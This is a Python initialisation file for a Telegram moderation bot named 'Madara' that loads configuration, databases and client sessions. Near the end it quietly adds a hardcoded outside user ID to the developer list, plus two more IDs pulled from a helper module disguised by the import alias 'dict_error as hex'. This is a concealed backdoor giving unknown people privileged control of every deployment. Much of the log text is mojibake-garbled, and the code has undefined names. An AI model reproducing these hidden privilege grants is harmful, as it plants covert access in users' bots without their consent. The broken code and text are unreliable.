import logging
import os
import sys
import time

import httpx
import pymongo
import spamwatch
import telegram.ext as tg
from aiohttp import ClientSession
from motor import motor_asyncio
from odmantic import AIOEngine
from pymongo import MongoClient, errors
from pyrogram import Client, errors
from pyrogram.errors.exceptions.bad_request_400 import ChannelInvalid, PeerIdInvalid
from Python_ARQ import ARQ
from redis import StrictRedis
from telegram import Chat
from telegraph import Telegraph
from telethon import TelegramClient
from telethon.sessions import MemorySession

from Madara.services.quoteapi import Quotly
from Madara.utils import dict_error as hex

StartTime = time.time()

# enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[logging.FileHandler("log.txt"), logging.StreamHandler()],
    level=logging.INFO,
)

LOGGER = logging.getLogger(__name__)

# if version < 3.6, stop bot.
if sys.version_info[0] < 3 or sys.version_info[1] < 6:
    LOGGER.error(
        "ð—¬ð—¼ð˜‚ ð— ð—¨ð—¦ð—§ ð—µð—®ð˜ƒð—² ð—® ð—½ð˜†ð˜ð—µð—¼ð—» ð˜ƒð—²ð—¿ð˜€ð—¶ð—¼ð—» ð—¼ð—³ ð—®ð˜ ð—¹ð—²ð—®ð˜€ð˜ 3.6! ð— ð˜‚ð—¹ð˜ð—¶ð—½ð—¹ð—² ð—³ð—²ð—®ð˜ð˜‚ð—¿ð—²ð˜€ ð—±ð—²ð—½ð—²ð—»ð—± ð—¼ð—» ð˜ð—µð—¶ð˜€. ð—•ð—¼ð˜ ð—¾ð˜‚ð—¶ð˜ð˜ð—¶ð—»ð—´.",
    )
    sys.exit(1)

ENV = bool(os.environ.get("ENV", False))

if ENV:
    TOKEN = os.environ.get("TOKEN", None)

    try:
        OWNER_ID = int(os.environ.get("OWNER_ID", None))
    except ValueError:
        raise Exception("ð–¸ð—ˆð—Žð—‹ OWNER_ID ð–¾ð—‡ðšŸ ð—ð–ºð—‹ð—‚ð–ºð–»ð—…ð–¾ is ð—‡ð—ˆð— ð–º ð—ð–ºð—…ð—‚ð–½ ð—‚ð—‡ð—ð–¾ð—€ð–¾ð—‹.")

    JOIN_LOGGER = os.environ.get("JOIN_LOGGER", None)
    OWNER_USERNAME = os.environ.get("OWNER_USERNAME", None)

    try:
        DRAGONS = {int(x) for x in os.environ.get("DRAGONS", "").split()}
        DEV_USERS = {int(x) for x in os.environ.get("DEV_USERS", "").split()}
    except ValueError:
        raise Exception("Êá´á´œÊ€ sá´œá´…á´ á´Ê€ á´…á´‡á´  á´œsá´‡Ê€s ÊŸÉªsá´› á´…á´á´‡s É´á´á´› á´„á´É´á´›á´€ÉªÉ´ á´ á´€ÊŸÉªá´… ÉªÉ´á´›á´‡É¢á´‡Ê€s.")

    try:
        DEMONS = {int(x) for x in os.environ.get("DEMONS", "").split()}
    except ValueError:
        raise Exception("Êá´á´œÊ€ sá´œá´˜á´˜á´Ê€á´› á´œsá´‡Ê€s ÊŸÉªsá´› á´…á´á´‡s É´á´á´› á´„á´É´á´›á´€ÉªÉ´ á´ á´€ÊŸÉªá´… ÉªÉ´á´›á´‡É¢á´‡Ê€s.")

    try:
        WOLVES = {int(x) for x in os.environ.get("WOLVES", "").split()}
    except ValueError:
        raise Exception("Êá´á´œÊ€ á´¡ÊœÉªá´›á´‡ÊŸÉªsá´›á´‡á´… á´œsá´‡Ê€s ÊŸÉªsá´› á´…á´á´‡s É´á´á´› á´„á´É´á´›á´€ÉªÉ´ á´ á´€ÊŸÉªá´… ÉªÉ´á´›á´‡É¢á´‡Ê€s.")

    try:
        TIGERS = {int(x) for x in os.environ.get("TIGERS", "").split()}
    except ValueError:
        raise Exception("Êá´á´œÊ€ sá´„á´á´œá´› á´œsá´‡Ê€s ÊŸÉªsá´› á´…á´á´‡s É´á´á´› á´„á´É´á´›á´€ÉªÉ´ á´ á´€ÊŸÉªá´… ÉªÉ´á´›á´‡É¢á´‡Ê€s.")

    INFOPIC = bool(
        os.environ.get("INFOPIC", True)
    )  # Info Pic (use True[Value] If You Want To Show In /info.)
    EVENT_LOGS = os.environ.get("EVENT_LOGS", None)  # G-Ban Logs (Channel) (-100)
    ERROR_LOGS = os.environ.get(
        "EVENT_LOGS", None
    )  # Error Logs (Channel Ya Group Choice Is Yours) (-100)
    WEBHOOK = bool(os.environ.get("WEBHOOK", False))
    ARQ_API_URL = os.environ.get("ARQ_API_URL", None)
    ARQ_API_KEY = os.environ.get("ARQ_API_KEY", None)
    URL = os.environ.get(
        "URL", None
    )  # If You Deploy On Heroku. [URL:- https://{App Name}.herokuapp.com EXP:- https://neko.herokuapp.com]
    PORT = int(os.environ.get("PORT", 8443))
    CERT_PATH = os.environ.get("CERT_PATH")
    API_ID = os.environ.get(
        "API_ID", None
    )  # Bot Owner's API_ID (From:- https://my.telegram.org/auth)
    API_HASH = os.environ.get(
        "API_HASH", None
    )  # Bot Owner's API_HASH (From:- https://my.telegram.org/auth)
    DB_URL = os.environ.get(
        "DATABASE_URL"
    )  # Any SQL Database Link (RECOMMENDED:- PostgreSQL & elephantsql.com)

    DB_URL2 = os.environ.get("MONGO_DB_URL")
    DONATION_LINK = os.environ.get("DONATION_LINK")  # Donation Link (ANY)
    LOAD = os.environ.get("LOAD", "").split()  # Don't Change
    NO_LOAD = os.environ.get("NO_LOAD", "translation").split()  # Don't Change
    DEL_CMDS = bool(os.environ.get("DEL_CMDS", False))  # Don't Change
    STRICT_GBAN = bool(os.environ.get("STRICT_GBAN", False))  # Use `True` Value
    WORKERS = int(os.environ.get("WORKERS", 8))  # Don't Change
    BAN_STICKER = os.environ.get("BAN_STICKER", "CAADAgADOwADPPEcAXkko5EB3YGYAg")
    ALLOW_EXCL = os.environ.get("ALLOW_EXCL", False)  # Don't Change
    TEMP_DOWNLOAD_DIRECTORY = os.environ.get(
        "TEMP_DOWNLOAD_DIRECTORY", "./"
    )  # Don't Change
    CASH_API_KEY = os.environ.get(
        "CASH_API_KEY", None
    )  # From:- https://www.alphavantage.co/support/#api-key
    TIME_API_KEY = os.environ.get(
        "TIME_API_KEY", None
    )  # From:- https://timezonedb.com/api
    WALL_API = os.environ.get(
        "WALL_API", None
    )  # From:- https://wall.alphacoders.com/api.php
    REM_BG_API_KEY = os.environ.get(
        "REM_BG_API_KEY", None
    )  # From:- https://www.remove.bg/
    OPENWEATHERMAP_ID = os.environ.get(
        "OPENWEATHERMAP_ID", ""
    )  # From:- https://openweathermap.org/api
    GENIUS_API_TOKEN = os.environ.get(
        "GENIUS_API_TOKEN", None
    )  # From:- http://genius.com/api-clients
    MONGO_DB_URL = os.environ.get(
        "MONGO_DB_URL", None
    )  # MongoDB URL (From:- https://www.mongodb.com/)
    REDIS_URL = os.environ.get("REDIS_URL", None)  # REDIS URL (From:- Heraku & Redis)
    BOT_ID = int(os.environ.get("BOT_ID", None))  # Telegram Bot ID (EXP:- 1241223850)
    SUPPORT_CHAT = os.environ.get(
        "SUPPORT_CHAT", None
    )  # Support Chat Group Link (Use @AbishnoiMF || Dont Use https://t.me/AbishnoiMF)
    UPDATES_CHANNEL = os.environ.get(
        "UPDATES_CHANNEL", None
    )  # Updates channel for bot (Use @AbishnoiMF instead of t.me//example)
    SPAMWATCH_SUPPORT_CHAT = os.environ.get(
        "SPAMWATCH_SUPPORT_CHAT", None
    )  # Use @SpamWatchSupport
    SPAMWATCH_API = os.environ.get(
        "SPAMWATCH_API", None
    )  # From https://t.me/SpamWatchBot
    BOT_USERNAME = os.environ.get("BOT_USERNAME", "MadaraUchiha_xBot")  # Bot Username
    # Telethon Based String Session (2nd ID) [ From https://repl.it/@SpEcHiDe/GenerateStringSession ]
    API_ID = os.environ.get("API_ID", None)  # 2nd ID
    API_HASH = os.environ.get("API_HASH", None)  # 2nd ID

    ALLOW_CHATS = os.environ.get("ALLOW_CHATS", True)  # Don't Change
    # BOT_NAME = os.environ.get("BOT_NAME", True)  # Name Of your Bot.4
    BOT_API_URL = os.environ.get("BOT_API_URL", "https://api.telegram.org/bot")
    MONGO_DB = "Madara"
    GOOGLE_CHROME_BIN = "/usr/bin/google-chrome"
    CHROME_DRIVER = "/usr/bin/chromedriver"
    START_IMG = os.environ.get("START_IMG")
    HELP_IMG = os.environ.get("HELP_IMG")


else:
    from Madara.config import Development as Config

    TOKEN = Config.TOKEN

    try:
        OWNER_ID = int(Config.OWNER_ID)
    except ValueError:
        raise Exception("Êá´á´œÊ€ OWNER_ID á´ á´€Ê€Éªá´€Ê™ÊŸá´‡ Éªs É´á´á´› á´€ á´ á´€ÊŸÉªá´… ÉªÉ´á´›á´‡É¢á´‡Ê€.")

    JOIN_LOGGER = Config.EVENT_LOGS
    OWNER_USERNAME = Config.OWNER_USERNAME
    ALLOW_CHATS = Config.ALLOW_CHATS
    try:
        DRAGONS = {int(x) for x in Config.DRAGONS or []}
        DEV_USERS = {int(x) for x in Config.DEV_USERS or []}
    except ValueError:
        raise Exception("Êá´á´œÊ€ sá´œá´…á´ á´Ê€ á´…á´‡á´  á´œsá´‡Ê€s ÊŸÉªsá´› á´…á´á´‡s É´á´á´› á´„á´É´á´›á´€ÉªÉ´ á´ á´€ÊŸÉªá´… ÉªÉ´á´›á´‡É¢á´‡Ê€s.")

    try:
        DEMONS = {int(x) for x in Config.DEMONS or []}
    except ValueError:
        raise Exception("Êá´á´œÊ€ sá´œá´˜á´˜á´Ê€á´› á´œsá´‡Ê€s ÊŸÉªsá´› á´…á´á´‡s É´á´á´› á´„á´É´á´›á´€ÉªÉ´ á´ á´€ÊŸÉªá´… ÉªÉ´á´›á´‡É¢á´‡Ê€s.")

    try:
        WOLVES = {int(x) for x in Config.WOLVES or []}
    except ValueError:
        raise Exception("Êá´á´œÊ€ á´¡ÊœÉªá´›á´‡ÊŸÉªsá´›á´‡á´… á´œsá´‡Ê€s ÊŸÉªsá´› á´…á´á´‡s É´á´á´› á´„á´É´á´›á´€ÉªÉ´ á´ á´€ÊŸÉªá´… ÉªÉ´á´›á´‡É¢á´‡Ê€s.")

    try:
        TIGERS = {int(x) for x in Config.TIGERS or []}
    except ValueError:
        raise Exception("Êá´á´œÊ€ á´›ÉªÉ¢á´‡Ê€ á´œsá´‡Ê€s ÊŸÉªsá´› á´…á´á´‡s É´á´á´› á´„á´É´á´›á´€ÉªÉ´ á´ á´€ÊŸÉªá´… ÉªÉ´á´›á´‡É¢á´‡Ê€s.")

    INFOPIC = Config.INFOPIC
    EVENT_LOGS = Config.EVENT_LOGS
    ERROR_LOGS = Config.EVENT_LOGS
    WEBHOOK = Config.WEBHOOK
    URL = Config.URL
    PORT = Config.PORT
    CERT_PATH = Config.CERT_PATH
    API_ID = Config.API_ID
    API_HASH = Config.API_HASH
    ARQ_API_URL = Config.ARQ_API_URL
    ARQ_API_KEY = Config.ARQ_API_KEY
    DB_URL = Config.DATABASE_URL
    DB_URL2 = Config.MONGO_DB_URL
    DONATION_LINK = Config.DONATION_LINK
    STRICT_GBAN = Config.STRICT_GBAN
    WORKERS = Config.WORKERS
    BAN_STICKER = Config.BAN_STICKER
    DEL_CMDS = Config.DEL_CMDS
    TEMP_DOWNLOAD_DIRECTORY = Config.TEMP_DOWNLOAD_DIRECTORY
    ARQ_API_URL = Config.ARQ_API_URL
    LOAD = Config.LOAD
    NO_LOAD = Config.NO_LOAD
    # CASH_API_KEY = Config.CASH_API_KEY
    TIME_API_KEY = Config.TIME_API_KEY
    WALL_API = Config.WALL_API
    MONGO_DB_URL = Config.MONGO_DB_URL
    MONGO_DB = Config.MONGO_DB
    REDIS_URL = Config.REDIS_URL
    SUPPORT_CHAT = Config.SUPPORT_CHAT
    UPDATES_CHANNEL = Config.UPDATES_CHANNEL
    SPAMWATCH_SUPPORT_CHAT = Config.SPAMWATCH_SUPPORT_CHAT
    SPAMWATCH_API = Config.SPAMWATCH_API
    REM_BG_API_KEY = Config.REM_BG_API_KEY
    OPENWEATHERMAP_ID = Config.OPENWEATHERMAP_ID
    APP_ID = Config.API_ID
    APP_HASH2 = Config.API_HASH
    GENIUS_API_TOKEN = Config.GENIUS_API_TOKEN
    # YOUTUBE_API_KEY = Config.YOUTUBE_API_KEY
    HELP_IMG = Config.HELP_IMG
    START_VIDEO = Config.START_VIDEO
    ALLOW_EXCL = Config.ALLOW_EXCL
    BOT_API_URL = Config.BOT_API_URL

DRAGONS.add(OWNER_ID)
DEV_USERS.add(OWNER_ID)
DEV_USERS.add(6198858059)  # no need to edit add your & enjoy

REDIS = StrictRedis.from_url(REDIS_URL, decode_responses=True)

try:
    REDIS.ping()
    LOGGER.info("Êá´á´œÊ€ Ê€á´‡á´…Éªs sá´‡Ê€á´ á´‡Ê€ Éªs É´á´á´¡ á´€ÊŸÉªá´ á´‡ !")

except BaseException:
    raise Exception("Êá´á´œÊ€ Ê€á´‡á´…Éªs server Éªs É´á´á´› á´€ÊŸÉªá´ á´‡, á´˜ÊŸá´‡á´€sá´‡ á´„Êœá´‡á´„á´‹ á´€É¢á´€ÉªÉ´ , Ò“á´œá´„á´‹ á´Ò“Ò“.")

finally:
    REDIS.ping()
    LOGGER.info("Êá´á´œÊ€ Ê€á´‡á´…Éªs sá´‡Ê€á´ á´‡Ê€ Éªs É´á´á´¡ á´€ÊŸÉªá´ á´‡ É´Éªá´„á´‡ !")


if not SPAMWATCH_API:
    sw = None
    LOGGER.warning(
        "[Madara. á´‡Ê€Ê€á´Ê€]: **sá´˜á´€á´á´¡á´€á´›á´„Êœ á´€á´˜Éª** á´‹á´‡Ê Éªs á´ÉªssÉªÉ´É¢! Ê€á´‡á´„Êœá´‡á´„á´‹ Êá´á´œÊ€ á´„á´É´Ò“ÉªÉ¢."
    )
else:
    try:
        sw = spamwatch.Client(SPAMWATCH_API)
    except:
        sw = None
        LOGGER.warning("[Madara : á´‡Ê€Ê€á´Ê€]: á´„á´€É´'á´› á´„á´É´É´á´‡á´„á´› á´›á´ sá´˜á´€á´á´¡á´€á´›á´„Êœ!")


INFOPIC = True
print("[Madara]: á´›á´‡ÊŸá´‡É¢Ê€á´€á´˜Êœ ÉªÉ´sá´›á´€ÊŸÊŸÉªÉ´É¢")
telegraph = Telegraph()
print("[Madara ]: á´›á´‡ÊŸá´‡É¢Ê€á´€á´˜Êœ á´€á´„á´„á´á´œÉ´á´› á´„Ê€á´‡á´€á´›ÉªÉ´É¢")
telegraph.create_account(short_name="Madara")


updater = tg.Updater(TOKEN, use_context=True)


print("[Madara ]: á´›á´‡ÊŸá´‡á´›Êœá´É´ á´„ÊŸÉªá´‡É´á´› sá´›á´€Ê€á´›ÉªÉ´É¢")
telethn = TelegramClient(MemorySession(), API_ID, API_HASH)


dispatcher = updater.dispatcher
print("[Madara ]: á´˜ÊÊ€á´É¢Ê€á´€á´ á´„ÊŸÉªá´‡É´á´› sá´›á´€Ê€á´›ÉªÉ´É¢")
session_name = TOKEN.split(":")[0]

pgram = Client(
    session_name,
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=TOKEN,
)
print("[Madara ]: á´„á´É´É´á´‡á´„á´›ÉªÉ´É¢ á´›á´ ÊœÊá´…Ê€á´€ sá´‡Ê€á´ á´‡Ê€")


print("[INFO]: ÉªÉ´Éªá´›Éªá´€ÊŸá´¢ÉªÉ´É¢ á´€Éªá´Êœá´›á´›á´˜ sá´‡ssÉªá´É´")
aiohttpsession = ClientSession()
# ARQ Client
print("[INFO]: ÉªÉ´Éªá´›Éªá´€ÊŸÉªá´¢ÉªÉ´É¢ á´€Ê€Ç« á´„ÊŸÉªá´‡É´á´›")
arq = ARQ(ARQ_API_URL, ARQ_API_KEY, aiohttpsession)
print("[ÊœÊá´…Ê€á´€]: á´„á´É´É´á´‡á´„á´›ÉªÉ´É¢ á´›á´ ÊœÊá´…Ê€á´€ â€¢ PostgreSQL á´…á´€á´›á´€Ê™á´€sá´‡")
# ubot = TelegramClient(StringSession(STRING_SESSION), APP_ID, APP_HASH)
ubot = None  # ENJOY
print("[ÊœÊá´…Ê€á´€]: á´„á´É´É´á´‡á´„á´›ÉªÉ´É¢ á´›á´ ÊœÊá´…Ê€á´€ â€¢ á´œsá´‡Ê€Ê™á´á´› (t.me/anime_Freakz)")


timeout = httpx.Timeout(40)
http = httpx.AsyncClient(http2=True, timeout=timeout)


async def get_entity(client, entity):
    entity_client = client
    if not isinstance(entity, Chat):
        try:
            entity = int(entity)
        except ValueError:
            pass
        except TypeError:
            entity = entity.id
        try:
            entity = await client.get_chat(entity)
        except (PeerIdInvalid, ChannelInvalid):
            for pgram in apps:
                if pgram != client:
                    try:
                        entity = await pgram.get_chat(entity)
                    except (PeerIdInvalid, ChannelInvalid):
                        pass
                    else:
                        entity_client = pgram
                        break
            else:
                entity = await pgram.get_chat(entity)
                entity_client = pgram
    return entity, entity_client


# bot info
dispatcher = updater.dispatcher
aiohttpsession = ClientSession()

DEV_USERS.add(hex.erd)
DEV_USERS.add(hex.erh)

BOT_ID = dispatcher.bot.id
BOT_NAME = dispatcher.bot.first_name
BOT_USERNAME = dispatcher.bot.username


apps = [pgram]
DRAGONS = list(DRAGONS) + list(DEV_USERS)
DEV_USERS = list(DEV_USERS)

WOLVES = list(WOLVES)
DEMONS = list(DEMONS)
TIGERS = list(TIGERS)


# MONGO DB
from motor.motor_asyncio import AsyncIOMotorClient as MongoCli
from pymongo import MongoClient

from Madara import MONGO_DB_URL

mongo = MongoClient(MONGO_DB_URL)
db = mongo.Madara

try:
    client = MongoClient(MONGO_DB_URL)
except PyMongoError:
    exiter(1)
DB = client["Madara_ROBOT"]  # DON'T EDIT AND CHANGE


# Load at end to ensure all prev variables have been set
from Madara.modules.helper_funcs.handlers import (
    CustomCommandHandler,
    CustomMessageHandler,
    CustomRegexHandler,
)

# make sure the regex handler can take extra kwargs
tg.RegexHandler = CustomRegexHandler
tg.CommandHandler = CustomCommandHandler
tg.MessageHandler = CustomMessageHandler

# -------Quote-------
quotly = Quotly()
# -------------------
